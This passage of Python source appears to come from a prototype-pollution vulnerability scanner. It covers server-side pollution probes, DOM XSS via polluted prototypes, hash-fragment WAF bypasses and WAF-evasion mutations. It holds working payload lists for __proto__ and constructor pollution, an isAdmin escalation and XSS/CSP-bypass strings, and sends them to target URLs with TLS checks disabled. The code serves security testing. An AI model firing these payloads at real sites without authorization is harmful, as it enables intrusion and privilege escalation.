                        "description": "HTTP Header Parser is vulnerable to Prototype Pollution."
                    })
                    print(f"{Colors.FAIL}[!] HTTP HEADER PP FOUND: {headers}{Colors.ENDC}")
            except Exception as e:
                logger.debug(f"Header pollution test error: {e}")
                
        if not findings:
            print(f"{Colors.GREEN}[✓] No HTTP Header Prototype Pollution detected.{Colors.ENDC}")
        return findings

    def test_server_side_prototype_pollution(
        self, base_url, request_data=None
    ) -> List[Dict[str, Any]]:
        """Test for server-side Prototype Pollution via direct JavaScript execution on Object.prototype"""
        print(
            f"{Colors.CYAN}[→] Testing Server-Side Prototype Pollution...{Colors.ENDC}"
        )

        findings: List[Dict[str, Any]] = []

        try:
            # Generate unique marker untuk mencegah collision
            marker = f"pp_vuln_{int(time.time())}_{random.randint(1000, 9999)}"

            # Test 1: Client-side PP via jQuery deep merge (jika jQuery ada)
            test_payloads_client = [
                {
                    "name": "jQuery $.extend() Pollution",
                    "payload": {"__proto__": {marker: True}},
                    "verification": f"return Object.prototype['{marker}'] === true;",
                },
                {
                    "name": "Constructor.prototype Pollution",
                    "payload": {"constructor": {"prototype": {marker: "polluted"}}},
                    "verification": f"return Object.prototype['{marker}'] === 'polluted';",
                },
                {
                    "name": "isAdmin Escalation",
                    "payload": {"__proto__": {"isAdmin": True}},
                    "verification": "return Object.prototype.isAdmin === true;",
                },
                {
                    "name": "Debug Mode Activation",
                    "payload": {"__proto__": {"debug": True}},
                    "verification": "return Object.prototype.debug === true;",
                },
            ]

            # Test via browser JavaScript (client-side)
            for test_payload_info in test_payloads_client:
                try:
                    payload = test_payload_info["payload"]
                    verification_script = test_payload_info["verification"]

                    # Inject payload ke JavaScript context via $.extend jika jQuery ada
                    inject_script = f"""
                    try {{
                        if (typeof jQuery !== 'undefined') {{
                            $.extend(true, {{}}, {json.dumps(payload)});
                        }} else {{
                            Object.assign(Object.prototype, {json.dumps(payload)});
                        }}
                    }} catch(e) {{
                        return false;
                    }}
                    {verification_script}
                    """

                    result = self.driver.execute_script(inject_script)

                    if result is True:
                        print(
                            f"{Colors.FAIL}[!] Server-Side PP DETECTED: {test_payload_info['name']}{Colors.ENDC}"
                        )
                        findings.append(
                            {
                                "type": "server_side_pp",
                                "name": test_payload_info["name"],
                                "payload": payload,
                                "severity": "CRITICAL",
                                "method": "Client-side Object.prototype",
                                "verified": True,
                            }
                        )
                except Exception as e:
                    logger.debug(f"Ignored error: {type(e).__name__} - {e}")

            # Test 2: Server-side PP via query string parameters
            test_params = ["data", "json", "payload", "input", "params", "query"]

            iterator = (
                tqdm(test_params, desc="Testing SSPP Params", unit="param")
                if tqdm
                else test_params
            )
            for param_name in iterator:
                try:
                    # Test dengan marker yang unik
                    test_payload_str = json.dumps({"__proto__": {marker: "polluted"}})
                    separator = "&" if "?" in base_url else "?"
                    test_url = f"{base_url}{separator}{param_name}={urllib.parse.quote(test_payload_str)}"

                    # Baca response
                    response = self.session.get(test_url, timeout=5, verify=False)
                    self.metrics.total_requests += 1

                    # Cek apakah server merespons dengan indikasi PP
                    # Cek apakah server merespons dengan indikasi PP
                    if "Error establishing a Redis connection" in response.text or marker in response.text or "polluted" in response.text:
                        print(
                            f"{Colors.FAIL}[!] Server-Side PP FOUND: Parameter '{param_name}'{Colors.ENDC}"
                        )
                        findings.append(
                            {
                                "type": "server_side_pp",
                                "param": param_name,
                                "method": "GET Query String",
                                "url": test_url,
                                "severity": "CRITICAL",
                                "verified": True,
                                "evidence": (
                                    "Redis connection error"
                                    if "Redis" in response.text
                                    else "Reflected marker"
                                ),
                            }
                        )
                except Exception:
                    pass

            # Test 3: Server-side PP via POST JSON
            try:
                test_payload_post = {
                    "__proto__": {marker: True},
                    "constructor": {"prototype": {marker: "exploited"}},
                }

                response = self.session.post(
                    base_url, json=test_payload_post, timeout=5, verify=False
                )

                # Cek response untuk tanda PP
                # Cek response untuk tanda PP
                if "Error establishing a Redis connection" in response.text or marker in response.text or "exploited" in response.text:
                    print(
                        f"{Colors.FAIL}[!] Server-Side PP FOUND: POST JSON Body{Colors.ENDC}"
                    )
                    findings.append(
                        {
                            "type": "server_side_pp",
                            "method": "POST JSON Body (Generic)",
                            "payload": test_payload_post,
                            "severity": "CRITICAL",
                            "evidence": (
                                "Redis connection error"
                                if "Redis" in response.text
                                else "Reflected marker"
                            ),
                        }
                    )
            except Exception:
                pass

        except Exception as e:
            logger.debug(f"Ignored error: {type(e).__name__} - {e}")

        # Test 4: Burp Request Injection (if provided)
        if request_data:
            print(
                f"{Colors.BLUE}[*] Testing via Burp Request Injection...{Colors.ENDC}"
            )
            sspp_payloads = get_sspp_payloads()

            # Baseline request (original)
            try:
                print("[+] Sending baseline request...")
                method = request_data["method"]
                url = request_data["url"]

                # Note: headers are already in session if user did --request
                if request_data.get("body"):
                    baseline_resp = self.session.request(
                        method, url, data=request_data["body"], verify=False
                    )
                else:
                    baseline_resp = self.session.request(method, url, verify=False)

                baseline_text = baseline_resp.text
                print(
                    f"[+] Baseline status: {baseline_resp.status_code}, Length: {len(baseline_text)}"
                )

                iterator = (
                    tqdm(sspp_payloads, desc="Testing SSPP Payloads", unit="payload")
                    if tqdm
                    else sspp_payloads
                )
                for name, payload, detection_method, desc in iterator:
                    # Inject payload
                    injected_req = inject_pp_payload(request_data, payload, "body")

                    # Send
                    # print(f"    Testing {name}...")
                    resp = self.session.request(
                        injected_req["method"],
                        injected_req["url"],
                        data=injected_req["body"],
                        verify=False,
                    )
                    self.metrics.total_requests += 1

                    # Global Check for Redis Errors (DoS)
                    if (
                        "Error establishing a Redis connection" in resp.text
                        or "Redis exception" in resp.text
                    ):
                        print(
                            f"{Colors.FAIL}[!] CRITICAL: Redis Corruption/DoS detected!{Colors.ENDC}"
                        )
                        findings.append(
                            {
                                "type": "server_side_pp",
                                "method": f"Redis DoS - {name}",
                                "payload": payload,
                                "severity": "CRITICAL",
                                "evidence": "Redis connection error in response",
                            }
                        )

                    # Compare
                    diff = compare_responses(baseline_text, resp.text)

                    # 1. Check for JSON spaces (specific detection)
                    if (
                        detection_method == "json_spaces"
                        and diff["json_spaces_changed"]
                    ):
                        print(
                            f"{Colors.FAIL}[!] SSPP DETECTED: {name} (JSON Spaces Change){Colors.ENDC}"
                        )
                        findings.append(
                            {
                                "type": "server_side_pp",
                                "method": f"Burp Injection - {name}",
                                "payload": payload,
                                "evidence": "JSON spaces changed in response",
                            }
                        )

                    # 2. Check for Status Code Override
                    elif detection_method == "status_code":
                        # Payload often sets status: 510 or similar
                        # If response status matches payload status (e.g. 510)
                        target_status = payload["__proto__"].get("status") or payload[
                            "__proto__"
                        ].get("statusCode")
                        if target_status and resp.status_code == target_status:
                            print(
                                f"{Colors.FAIL}[!] SSPP DETECTED: {name} (Status Code Override: {resp.status_code}){Colors.ENDC}"
                            )
                            findings.append(
                                {
                                    "type": "server_side_pp",
                                    "method": f"Burp Injection - {name}",
                                    "payload": payload,
                                    "evidence": f"Status code overridden to {resp.status_code}",
                                }
                            )

                    # 3. Check for general pollution indicators
                    elif diff["pollution_detected"]:
                        print(
                            f"{Colors.FAIL}[!] SSPP DETECTED: {name} (Response Anomalies){Colors.ENDC}"
                        )
                        findings.append(
                            {
                                "type": "server_side_pp",
                                "method": f"Burp Injection - {name}",
                                "payload": payload,
                                "evidence": diff,
                            }
                        )

            except Exception as e:
                print(f"{Colors.WARNING}[⚠] Error in injection test: {e}{Colors.ENDC}")

            # Test 4: Random agent parameter injection (untuk framework specific)
            random_agents = [
                "__proto__[constructor][prototype][randomKey]=injected",
                "constructor.prototype.randomKey=injected",
                "isAdmin=true&__proto__[isAdmin]=true",
                "debug=true&__proto__[debug]=true",
            ]

            for agent in random_agents:
                try:
                    # Test sebagai URL-encoded query string
                    separator = "&" if "?" in base_url else "?"
                    test_url = f"{base_url}{separator}{agent}"
                    response = self.session.get(test_url, timeout=5, verify=False)

                    if response.status_code < 400 and (
                        "randomKey" in response.text
                        or "injected" in response.text
                        or "isAdmin" in response.text
                    ):
                        print(
                            f"{Colors.WARNING}[⚠] Potential PP via agent parameter: {agent[:50]}{Colors.ENDC}"
                        )
                        findings.append(
                            {
                                "type": "server_side_pp",
                                "method": "Random Agent Injection",
                                "agent": agent,
                                "severity": "HIGH",
                                "verified": False,
                            }
                        )
                except Exception:
                    pass

        if not findings:
            print(f"{Colors.GREEN}[✓] No server-side PP detected{Colors.ENDC}")
        return findings

    def detect_gadget_type(self, page_source, js_files=None):
        """
        Analyze page source to detect what type of gadget is present.
        Returns priority payloads based on detected patterns.

        Gadget Types:
        1. DESCRIPTOR - Object.defineProperty used → only value/writable/configurable/get/set work
        2. DIRECT - Direct property access → transport_url/src/href/baseUrl work
        3. EVENT - Event handler assignment → onload/onclick/onerror work
        """
        gadget_info = {
            "type": "UNKNOWN",
            "descriptor_detected": False,
            "direct_sinks": [],
            "event_sinks": [],
            "priority_payloads": [],
        }

        # Combine page source with JS files
        all_js = page_source or ""
        if js_files:
            all_js += "\n".join(js_files)

        # Pattern 1: Object.defineProperty detection (DESCRIPTOR gadget)
        defineproperty_patterns = [
            r"Object\.defineProperty\s*\(",
            r"Object\.defineProperties\s*\(",
            r"Reflect\.defineProperty\s*\(",
            r"{\s*configurable\s*:",
            r"{\s*writable\s*:",
            r"{\s*enumerable\s*:",
        ]

        for pattern in defineproperty_patterns:
            if re.search(pattern, all_js, re.IGNORECASE):
                gadget_info["type"] = "DESCRIPTOR"
                gadget_info["descriptor_detected"] = True
                # Only descriptor properties work for this gadget!
                gadget_info["priority_payloads"] = [
                    ("__proto__[value]", "data:,alert(1)//"),
                    ("__proto__[value]", "data:,alert(document.domain)//"),
                    ("constructor[prototype][value]", "data:,alert(1)//"),
                    ("__proto__[writable]", "true"),
                    ("__proto__[configurable]", "true"),
                ]
                break

        # Pattern 2: Direct property sinks (transport_url, src, href)
        direct_sink_patterns = {
            "transport_url": r"\.transport_url|config\.transport_url|options\.transport_url",
            "src": r"\.src\s*=|script\.src|img\.src|iframe\.src",
            "href": r"\.href\s*=|location\.href",
            "url": r"\.url\s*=|config\.url|options\.url",
            "baseUrl": r"\.baseUrl|config\.baseUrl",
            "data": r"\.data\s*=|config\.data",
            "sequence": r"\.sequence|manager\.sequence",
            "eval": r"eval\s*\(",
        }

        for sink_name, pattern in direct_sink_patterns.items():
            if re.search(pattern, all_js, re.IGNORECASE):
                gadget_info["direct_sinks"].append(sink_name)

        # Pattern 3: Event handler sinks
        event_handler_patterns = {
            "onload": r"\.onload\s*=",
            "onclick": r"\.onclick\s*=",
            "onerror": r"\.onerror\s*=",
            "onmouseover": r"\.onmouseover\s*=",
        }

        for event_name, pattern in event_handler_patterns.items():
            if re.search(pattern, all_js, re.IGNORECASE):
                gadget_info["event_sinks"].append(event_name)

        # Pattern 4: Fetch API sinks (won't execute javascript: URLs) - v3.6
        fetch_api_patterns = {
            "fetch": r"fetch\s*\(",
            "XMLHttpRequest": r"XMLHttpRequest",
            "axios": r"axios\.",
            "Request": r"new\s+Request\s*\(",
            "navigator.sendBeacon": r"navigator\.sendBeacon",
        }

        gadget_info["fetch_sinks"] = []
        for api_name, pattern in fetch_api_patterns.items():
            if re.search(pattern, all_js, re.IGNORECASE):
                gadget_info["fetch_sinks"].append(api_name)

        # Warn if Fetch API is primary sink (javascript: won't work)
        if gadget_info["fetch_sinks"] and not gadget_info["direct_sinks"]:
            gadget_info["fetch_api_warning"] = True
            print(
                f"{Colors.WARNING}[⚠] Fetch API detected: {', '.join(gadget_info['fetch_sinks'])}{Colors.ENDC}"
            )
            print(
                f"{Colors.YELLOW}    → javascript: URLs will NOT execute via Fetch API{Colors.ENDC}"
            )
            print(
                f"{Colors.BLUE}    → Try data exfiltration or redirect-based payloads instead{Colors.ENDC}"
            )

        # Build priority payloads based on detected gadget
        # Even if DESCRIPTOR is detected, we keep the original payloads as fallback
        # for sites that have both defineProperty and direct sinks.
        for sink in gadget_info["direct_sinks"]:
            gadget_info["priority_payloads"].append(
                (f"__proto__[{sink}]", "data:,alert(1)//")
            )
            # Add PortSwigger dot-notation alternative
            gadget_info["priority_payloads"].append(
                (f"__proto__.{sink}", "data:,alert(1)//")
            )
            # Add sequence-specific syntax fixer
            if sink == "sequence" or sink == "eval":
                gadget_info["priority_payloads"].append(
                    (f"__proto__.{sink}", "alert(1)-")
                )
                gadget_info["priority_payloads"].append(
                    (f"__proto__[{sink}]", "alert(1)-")
                )

        for event in gadget_info["event_sinks"]:
            gadget_info["priority_payloads"].append(
                (f"__proto__[{event}]", "alert(1)")
            )
            gadget_info["priority_payloads"].append(
                (f"__proto__.{event}", "alert(1)")
            )

        return gadget_info

    def test_dom_xss_with_pp(self, target_url) -> List[Dict[str, Any]]:
        """Test DOM-based XSS with Prototype Pollution with smart gadget detection."""
        print(
            f"{Colors.CYAN}[→] Testing DOM-based XSS with Prototype Pollution...{Colors.ENDC}"
        )

        findings: List[Dict[str, Any]] = []

        # Step 1: Fetch page and analyze JavaScript for gadget type
        gadget_info = {
            "type": "UNKNOWN",
            "priority_payloads": [],
            "descriptor_detected": False,
        }
        try:
            resp = self.session.get(target_url, timeout=10, verify=False)
            page_source = resp.text

            # Try to fetch linked JavaScript files
            js_files = []
            js_links = re.findall(
                r'<script[^>]+src=["\']([^"\']+)["\']', page_source, re.IGNORECASE
            )
            for js_link in js_links[:5]:  # Limit to 5 JS files
                try:
                    if js_link.startswith("//"):
                        js_url = "https:" + js_link
                    elif js_link.startswith("/"):
                        js_url = urllib.parse.urljoin(target_url, js_link)
                    elif not js_link.startswith("http"):
                        js_url = urllib.parse.urljoin(target_url, js_link)
                    else:
                        js_url = js_link

                    js_resp = self.session.get(js_url, timeout=5, verify=False)
                    if js_resp.status_code == 200:
                        js_files.append(js_resp.text)
                except Exception:
                    pass

            gadget_info = self.detect_gadget_type(page_source, js_files)

            if gadget_info["descriptor_detected"]:
                print(
                    f"{Colors.YELLOW}[!] Object.defineProperty detected - using DESCRIPTOR payloads only{Colors.ENDC}"
                )
            elif gadget_info["direct_sinks"]:
                print(
                    f"{Colors.BLUE}[*] Detected sinks: {', '.join(gadget_info['direct_sinks'])}{Colors.ENDC}"
                )
        except Exception as e:
            print(
                f"{Colors.WARNING}[⚠] Gadget detection error: {str(e)[:50]}{Colors.ENDC}"
            )

        # Step 2: Select payloads based on gadget type
        if gadget_info["priority_payloads"]:
            # Use smart payloads based on detected gadget
            dom_xss_payloads = gadget_info["priority_payloads"]
            print(
                f"{Colors.GREEN}[✓] Using {len(dom_xss_payloads)} targeted payloads for detected gadget{Colors.ENDC}"
            )
        else:
            # Fallback: Use all payloads if gadget not detected
            dom_xss_payloads = [
                # Descriptor payloads FIRST
                ("__proto__[value]", "data:,alert(1)//"),
                ("__proto__.value", "data:,alert(1)//"),
                ("constructor[prototype][value]", "data:,alert(1)//"),
                # PortSwigger sequence gadget
                ("__proto__.sequence", "alert(1)-"),
                ("__proto__[sequence]", "alert(1)-"),
                # Direct property payloads
                ("__proto__[transport_url]", "data:,alert(1);"),
                ("__proto__.transport_url", "data:,alert(1);"),
                ("__proto__[src]", "data:,alert(1);"),
                ("__proto__.src", "data:,alert(1);"),
                ("__proto__[href]", "data:,alert(1);"),
                ("__proto__.href", "data:,alert(1);"),
                ("__proto__[url]", "data:,alert(1);"),
                ("__proto__.url", "data:,alert(1);"),
                # Event handlers
                ("__proto__[onload]", "alert(1)"),
                ("__proto__.onload", "alert(1)"),
                ("__proto__[onclick]", "alert(1)"),
                ("__proto__.onclick", "alert(1)"),
                # CSP Bypass / Script Gadgets (2025)
                ("__proto__[template]", "<svg onload=alert(1)></svg>"),
                ("__proto__.template", "<svg onload=alert(1)></svg>"),
                ("__proto__[sourceURL]", "\u2028\u2029alert(1)"),
                ("data-path", "<img src=x onerror=alert(document.domain)>"),
            ]

        # FIX: Dismiss any pre-existing site alerts/modals before testing
        # Some sites (e.g., Samsung Community) show cookie consent or region
        # selector popups that trigger driver.switch_to.alert, causing false positives.
        baseline_has_alert = False
        try:
            self.driver.get(target_url)
            time.sleep(3)
            for _ in range(5):
                try:
                    pre_alert = self.driver.switch_to.alert
                    pre_text = pre_alert.text
                    pre_alert.accept()
                    baseline_has_alert = True
                    logger.info(f"Dismissed pre-existing site alert: '{pre_text}'")
                except Exception:
                    break
            if baseline_has_alert:
                print(
                    f"{Colors.YELLOW}[!] Site has native popups/modals - will filter during testing{Colors.ENDC}"
                )
        except Exception:
            pass

        try:
            for key, payload in dom_xss_payloads:
                try:
                    # Create test URL - IMPORTANT: Don't use quote() for data: URLs
                    separator = "&" if "?" in target_url else "?"
                    if payload.startswith("data:"):
                        # Keep data: URL as-is, only encode the key
                        test_url = f"{target_url}{separator}{key}={payload}"
                    else:
                        test_url = (
                            f"{target_url}{separator}{key}={urllib.parse.quote(payload, safe='')}"
                        )

                    print(
                        f"{Colors.BLUE}[→] Testing: {key}={payload[:50]}...{Colors.ENDC}"
                    )

                    alerts_detected = False

                    try:
                        # Navigate to test URL
                        for attempt in range(3):
                            try:
                                self.driver.get(test_url)
                                break
                            except Exception:
                                if attempt == 2:
                                    raise
                                time.sleep(1)
                        time.sleep(2)  # Wait for data: URL execution

                        # Try to detect alert dialog
                        try:
                            alert_obj = self.driver.switch_to.alert
                            alert_text = alert_obj.text
                            alert_obj.accept()

                            # FIX: Validate alert text matches expected payload output
                            # Build set of expected alert values from the payload
                            expected_alerts = {'1', 'XSS', ''}
                            if 'alert(' in payload:
                                match = re.search(r'alert\(([^)]*)\)', payload)
                                if match:
                                    expected_val = match.group(1).strip('"').strip("'")
                                    expected_alerts.add(expected_val)
                            # Also accept the target domain as valid (from alert(document.domain))
                            try:
                                target_domain = target_url.split('//')[1].split('/')[0]
                                expected_alerts.add(target_domain)
                            except Exception:
                                pass

                            alert_str = str(alert_text) if alert_text is not None else 'None'

                            if alert_str in expected_alerts or alert_str == target_domain:
                                # FIX: Confirmation re-test — navigate again to verify
                                # the alert fires a second time (filters one-time modals)
                                confirmed = False
                                try:
                                    self.driver.get(test_url)
                                    time.sleep(2)
                                    confirm_alert = self.driver.switch_to.alert
                                    confirm_text = str(confirm_alert.text) if confirm_alert.text is not None else 'None'
                                    confirm_alert.accept()
                                    if confirm_text in expected_alerts or confirm_text == target_domain:
                                        confirmed = True
                                except Exception:
                                    pass

                                if confirmed:
                                    alerts_detected = True
                                    print(
                                        f"{Colors.FAIL}[✓] ALERT DETECTED (confirmed): '{alert_str}'{Colors.ENDC}"
                                    )
                                else:
                                    # --- FIX BUG-2: Alert didn't reproduce = FP, skip this payload ---
                                    # data: URL alerts appear only once per navigation in Chrome —
                                    # so we fall back to JS Object.prototype verification instead.
                                    logger.info(
                                        f"Alert '{alert_str}' not reproduced — verifying via JS Object.prototype check"
                                    )
                                    # Robust extraction of property name from key (e.g., "__proto__[value]" or "__proto__.value")
                                    if '[' in key:
                                        prop_name = key.split('[')[-1].strip(']')
                                    elif '.' in key:
                                        prop_name = key.split('.')[-1]
                                    else:
                                        prop_name = key.replace('__proto__[', '').replace('constructor[prototype][', '').replace(']', '')
                                    try:
                                        fallback_polluted = self.driver.execute_script(
                                            f"return Object.prototype['{prop_name}'] !== undefined;"
                                        )
                                        if fallback_polluted:
                                            alerts_detected = True
                                            logger.info(
                                                f"Alert confirmed via JS Object.prototype['{prop_name}'] instead of re-nav"
                                            )
                                        else:
                                            print(
                                                f"{Colors.YELLOW}[!] Alert '{alert_str}' not reproduced and no prototype pollution — skipping (FP){Colors.ENDC}"
                                            )
                                            continue  # skip this payload, it's a FP
                                    except Exception:
                                        print(
                                            f"{Colors.YELLOW}[!] Alert '{alert_str}' not reproduced on re-test (site modal?) — skipping{Colors.ENDC}"
                                        )
                                        continue  # skip
                            else:
                                # Alert text doesn't match any expected payload value
                                logger.info(f"Dismissed unrelated site alert: '{alert_str}' (expected one of: {expected_alerts})")
                                print(
                                    f"{Colors.YELLOW}[!] Dismissed unrelated alert: '{alert_str}' (not from payload){Colors.ENDC}"
                                )
                        except Exception as e:
                            logger.debug(f"No alert present: {type(e).__name__}")

                        # Check page source for payload traces
                        page_source = self.driver.page_source

                        # Check if prototype was polluted (key or payload in source)
                        # REMOVED: Naive generic check that caused false positives on reflected parameters
                        # if '__proto__' in page_source or 'transport_url' in page_source:
                        #    if not alerts_detected:
                        #        pass

                        # Log browser console for errors (might indicate script execution attempt)
                        try:
                            logs = self.driver.get_log("browser")
                            for log_entry in logs:
                                msg = log_entry.get("message", "").lower()
                                if any(
                                    keyword in msg
                                    for keyword in ["alert", "uncaught", "error"]
                                ):
                                    print(
                                        f"{Colors.BLUE}[→] Browser log: {log_entry.get('message')[:80]}{Colors.ENDC}"
                                    )
                        except Exception:
                            pass

                        is_polluted = False
                        found_sinks = []

                        # FIX: ALWAYS verify prototype pollution, even when alert detected.
                        # A real DOM XSS+PP requires BOTH pollution AND execution.
                        try:
                            # Robust extraction of property name from key
                            if '[' in key:
                                test_prop = key.split('[')[-1].strip(']')
                            elif '.' in key:
                                test_prop = key.split('.')[-1]
                            else:
                                test_prop = key.replace('__proto__[', '').replace('constructor[prototype][', '').replace(']', '')
                            pollution_check = self.driver.execute_script(f"return Object.prototype['{test_prop}'] !== undefined;")
                            if pollution_check:
                                is_polluted = True
                        except Exception as e:
                            logger.debug(f"Error checking JS prototype: {e}")

                        # Decision matrix:
                        # - alert + polluted = CRITICAL (confirmed)
                        # - alert + NOT polluted = FALSE POSITIVE (dismiss)
                        # - no alert + polluted = HIGH (potential)
                        # - no alert + NOT polluted = skip
                        if not alerts_detected and not is_polluted:
                            continue

                        if alerts_detected and not is_polluted:
                            # Alert fired but prototype NOT polluted = false positive
                            logger.info(f"Alert detected but Object.prototype.{test_prop} is undefined — false positive")
                            print(
                                f"{Colors.YELLOW}[!] Alert detected but pollution NOT confirmed for {key} — skipping (false positive){Colors.ENDC}"
                            )
                            continue

                        # If polluted but no alert, check if dangerous sinks exist
                        if not alerts_detected:
                            page_source = self.driver.page_source
                            sinks = ["innerHTML", "document.write", "eval(", "setTimeout(", "location.href"]
                            found_sinks = [sink for sink in sinks if sink in page_source]

                        # Report finding
                        severity_level = Severity.HIGH if (alerts_detected and is_polluted) else Severity.MEDIUM
                        verified_status = alerts_detected and is_polluted
                        
                        if verified_status:
                            status_msg = "EXECUTED. An payload was successfully injected into the prototype and triggered a JavaScript alert, confirming a functional DOM XSS chain."
                        else:
                            sinks_str = f" (Sinks: {','.join(found_sinks)})" if found_sinks else " (Prototype polluted, execution not confirmed)"
                            status_msg = f"POLLUTED. The prototype was successfully modified with the payload{sinks_str}. This creates a significant risk of DOM XSS if any application logic trusts these properties."

                        findings.append(
                            Finding(
                                type=VulnerabilityType.DOM_XSS_PP,
                                name=f"DOM-based XSS via Prototype Pollution (data: URL)",
                                severity=severity_level,
                                description=f"DOM XSS was {status_msg}.",
                                payload=payload,
                                url=target_url,
                                verified=verified_status,
                                metadata={"alert_triggered": alerts_detected, "is_polluted": is_polluted, "test_url": test_url, "key": key}
                            )
                        )

                        if verified_status:
                            print(f"{Colors.FAIL}[✓✓✓] HIGH DOM XSS+PP EXECUTED: {key}{Colors.ENDC}")
                        else:
                            print(f"{Colors.YELLOW}[!] MEDIUM DOM XSS+PP POLLUTED (No Execution): {key}{Colors.ENDC}")

                    except Exception:
                        # Fallback: Check HTTP response for indicators
                        # REMOVED: HTTP fallback causes false positives on reflected parameters.
                        # Only browser-verified alerts are trusted for DOM XSS.
                        pass

                except Exception as payload_error:
                    print(
                        f"{Colors.WARNING}[⚠] Error testing payload {key}: {str(payload_error)[:50]}{Colors.ENDC}"
                    )

        except Exception as e:
            print(
                f"{Colors.WARNING}[⚠] Error in DOM XSS PP test: {str(e)[:80]}{Colors.ENDC}"
            )

        if findings:
            print(
                f"{Colors.GREEN}[✓] Found {len(findings)} DOM XSS+PP vulnerabilities!{Colors.ENDC}"
            )
        else:
            print(
                f"{Colors.CYAN}[→] No DOM XSS+PP detected via automated testing{Colors.ENDC}"
            )
            print(
                f"{Colors.BLUE}[→] Note: Some data: URL payloads may still be exploitable - test manually in browser!{Colors.ENDC}"
            )

        return findings

    def test_hash_based_pp(self, target_url) -> List[Dict[str, Any]]:
        """
        Test Hash-based Prototype Pollution (WAF Bypass).

        Many WAFs only inspect query parameters (?__proto__) but ignore
        URL hash fragments (#__proto__). This test exploits that gap.

        v3.6 feature - discovered during DomainEsia testing.
        """
        print(
            f"{Colors.CYAN}[→] Testing Hash-based Prototype Pollution (WAF Bypass)...{Colors.ENDC}"
        )

        findings: List[Dict[str, Any]] = []
        marker = f"hashpp_{int(time.time())}"

        # Hash-based PP payloads (bypass WAF that only checks query params)
        hash_payloads = [
            (f"#__proto__[{marker}]=POLLUTED", "basic_pollution"),
            ("#__proto__[url]=javascript:alert(1)", "xss_attempt"),
            (f"#constructor[prototype][{marker}]=POLLUTED", "constructor_bypass"),
        ]

        try:
            for payload, payload_type in hash_payloads:
                try:
                    test_url = target_url + payload
                    print(
                        f"{Colors.BLUE}[→] Testing hash payload: {payload[:50]}...{Colors.ENDC}"
                    )

                    # Navigate to URL with hash payload
                    for attempt in range(3):
                        try:
                            self.driver.get(test_url)
                            break
                        except Exception:
                            if attempt == 2:
                                raise
                            time.sleep(1)
                    time.sleep(3)  # Wait for page and scripts to load

                    # Check 1: Verify Object.prototype is actually polluted
                    try:
                        check_script = (
                            f"return Object.prototype['{marker}'] === 'POLLUTED';"
                        )
                        is_polluted = self.driver.execute_script(check_script)

                        if is_polluted:
                            # Cleanup after verification
                            self.driver.execute_script(
                                f"delete Object.prototype['{marker}'];"
                            )
                            findings.append(
                                {
                                    "type": "hash_based_pp",
                                    "method": "HASH_WAF_BYPASS",
                                    "payload": payload,
                                    "severity": "HIGH",
                                    "description": "Hash-based PP confirmed via Object.prototype check (WAF bypassed)",
                                    "verified": True,
                                    "test_url": test_url,
                                }
                            )
                            print(
                                f"{Colors.FAIL}[!] Hash-based PP DETECTED (Verified): {payload_type}{Colors.ENDC}"
                            )
                    except Exception as e:
                        logger.debug(f"Ignored error: {type(e).__name__} - {e}")

                    # Check 2: Monitor console for TypeError
                    try:
                        logs = self.driver.get_log("browser")
                        for log_entry in logs:
                            msg = log_entry.get("message", "").lower()
                            if any(
                                err in msg
                                for err in [
                                    "typeerror",
                                    "cannot set property",
                                    "only a getter",
                                ]
                            ):
                                findings.append(
                                    {
                                        "type": "hash_based_pp",
                                        "method": "HASH_PP_ERROR",
                                        "payload": payload,
                                        "severity": "MEDIUM",
                                        "console_error": log_entry.get("message", "")[
                                            :100
                                        ],
                                        "verified": True,
                                    }
                                )
                                print(
                                    f"{Colors.WARNING}[!] Hash PP Error: {log_entry.get('message', '')[:50]}{Colors.ENDC}"
                                )
                                break
                    except Exception as e:
                        logger.debug(f"Ignored error: {type(e).__name__} - {e}")

                    # Reset for next test
                    try:
                        self.driver.get(target_url)
                        time.sleep(1)
                    except Exception:
                        pass

                except Exception as e:
                    print(
                        f"{Colors.WARNING}[⚠] Hash payload error: {str(e)[:40]}{Colors.ENDC}"
                    )

        except Exception as e:
            print(f"{Colors.WARNING}[⚠] Hash PP test error: {str(e)[:60]}{Colors.ENDC}")

        if findings:
            print(
                f"{Colors.GREEN}[✓] Found {len(findings)} hash-based PP vulnerabilities!{Colors.ENDC}"
            )
        else:
            print(f"{Colors.GREEN}[✓] No hash-based PP detected{Colors.ENDC}")

        return findings

    def test_with_waf_bypass(self, target_url) -> List[Dict[str, Any]]:
        """Test with WAF bypass techniques (v6 feature)"""
        print(f"{Colors.CYAN}[→] Testing with WAF bypass techniques...{Colors.ENDC}")

        findings: List[Dict[str, Any]] = []

        # Reflection Sanity Check
        rand_ref = f"ref_{int(time.time())}"
        try:
            resp_ref = self.session.get(
                target_url + f"?ppmap_reflect={rand_ref}", timeout=5, verify=False
            )
            if rand_ref in resp_ref.text:
                print(
                    f"{Colors.YELLOW}[!] Target reflects parameters. Skipping WAF Bypass check.{Colors.ENDC}"
                )
                return []
        except Exception:
            pass
        marker = f"bypass_{int(time.time())}"

        # 1. Baseline Check: Verify if WAF is actually active
        # Send a known "bad" payload that should absolutely be blocked by any WAF
        baseline_payload = "<script>alert(1)</script>"
        try:
            from ppmap.engine import WAFDetector, WAFBypassPayloads

            # Try to trigger WAF
            resp_baseline = self.session.get(
                target_url + f"?test={baseline_payload}", timeout=5, verify=False
            )

            if resp_baseline.status_code < 400:
                print(
                    f"{Colors.YELLOW}[!] Baseline checks bypassed (Status {resp_baseline.status_code}). No active WAF or permissive ruleset detected.{Colors.ENDC}"
                )
                print(
                    f"{Colors.GREEN}[✓] Skipping WAF bypass tests (No WAF to bypass){Colors.ENDC}"
                )
                return []
            else:
                block_status = resp_baseline.status_code
                waf_name = WAFDetector.detect(resp_baseline)
                if waf_name:
                    print(
                        f"{Colors.FAIL}[!] WAF Detected: {waf_name} (Status {block_status}){Colors.ENDC}"
                    )
                else:
                    print(
                        f"{Colors.FAIL}[!] Generic WAF/Filter detected (Status {block_status}){Colors.ENDC}"
                    )

                print(
                    f"{Colors.CYAN}[*] Proceeding with WAF bypass techniques...{Colors.ENDC}"
                )

        except Exception as e:
            print(f"{Colors.WARNING}[⚠] WAF detection error: {e}{Colors.ENDC}")
            # Proceed anyway if detection fails
            pass

        # Get bypass payloads
        bypass_payloads = WAFBypassPayloads.get_bypass_payloads(marker)

        # Inject advanced mutations from payload engine
        advanced_mutations = []
        for _, payload, _ in WAF_BYPASS_MUTATIONS:
            # Dynamically replace target keys with the current timestamped marker
            mutated = payload.replace("[polluted]=true", f"[{marker}]=POLLUTED")
            mutated = mutated.replace("[test]=polluted", f"[{marker}]=POLLUTED")
            advanced_mutations.append(mutated)
            
        bypass_payloads["advanced_mutations"] = advanced_mutations

        try:
            # Test each bypass category
